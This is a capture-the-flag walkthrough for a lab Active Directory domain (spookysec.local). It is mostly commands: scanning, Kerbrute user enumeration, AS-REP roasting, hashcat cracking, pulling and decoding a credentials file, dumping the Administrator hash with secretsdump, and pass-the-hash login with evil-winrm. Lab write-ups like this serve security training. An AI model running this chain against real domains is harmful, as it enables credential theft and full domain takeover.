# Attacktive directory

## Attack tree

```text

```

## Example

### Scanning

    # nmap -sV -sC -T4 <IP address target>

### Enumerate the DC with enum4linux

    # enum4linux <IP address target>

### Enumerate the DC with Kerbrute

Add the following line to `/etc/hosts` file:

    <IP address target> spookysec.local

Download the user list and password list in the ~/Downloads directory:

```text
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
```

Run the kerbrute command in the ~/Downloads directory:

    # /opt/kerbrute/kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt -t 100

### Exploiting Kerberos

Kerberos pre-authentication has been disabled for svc-admin. Get the ticket:

    # cd /opt/impacket/examples
    # python GetNPUsers.py spookysec.local/svc-admin -no-pass

Check what [type of hash](https://hashcat.net/wiki/doku.php?id=example_hashes) was retrieved:

    Kerberos 5 AS-REP etype 23 -> mode 18200

Crack the hash with the modified password list:

    # hashcat --force -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt

Connect to the share using smbclient:

```text
smbclient '\\spookysec.local\backup' -U svc-admin
smb: \> ls
smb: \>mget backup_credentials.txt
exit
```

Decode using [base64](https://www.base64decode.org/). We now have the credentials of the backup account.

`secretdump.py` is part of impacket:

```text
cd /opt/impacket/examples
python3 secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator
```

Now we have the password: management2005

### Enumerate the DC again

Map remote shares:

    $ smbclient -U spookysec.local/svc-admin -L //<IP target machine>
    Enter SPOOKYSEC.LOCAL\svc-admin's password: 

And:

    $ smbclient -U spookysec.local/svc-admin //<IP target machine>/backup
    Enter SPOOKYSEC.LOCAL\svc-admin's password: 
    Try "help" to get a list of possible commands.
    smb: \> ls
      .                                   D        0  Sat Apr  4 19:08:39 2020
      ..                                  D        0  Sat Apr  4 19:08:39 2020
      backup_credentials.txt              A       48  Sat Apr  4 19:08:53 2020

Get them backup credentials:

    smb: \> get backup_credentials.txt

It contains base64 encoded credentials. Decoding the base64 string reveals the credentials:
    
    $ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
    [email protected]:backup2517860

Rretrieve all password hashes that this user account (which is synced with the domain controller) has to offer. 
Exploiting this, we will have full control over the AD Domain.

    $ python secretsdump.py spookysec.local/backup:FOUNDPASSWORDHERE@spookysec.local -just-dc-user Administrator

Pass the Hash with Evil-WinRM:

    $ evil-winrm -i <IP target machine> -u Administrator -H THEFOUNDHASH

All flags are in the users desktops. The Administrator account has got acces to all.

## Tools

* [Impacket](https://github.com/SecureAuthCorp/impacket)

```text
# git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
# pip3 install -r /opt/impacket/requirements.txt
# cd /opt/impacket/ && python3 ./setup.py install
```

* [Bloodhound](https://github.com/BloodHoundAD/BloodHound)

```text
# apt install bloodhound neo4j
```

* [Kerbrute](https://github.com/ropnop/kerbrute/releases/)

```text
# chmod +x filename
# mkdir /opt/kerbrute
# cp kerbrute_linux_amd64 /opt/kerbrute/kerbrute
```
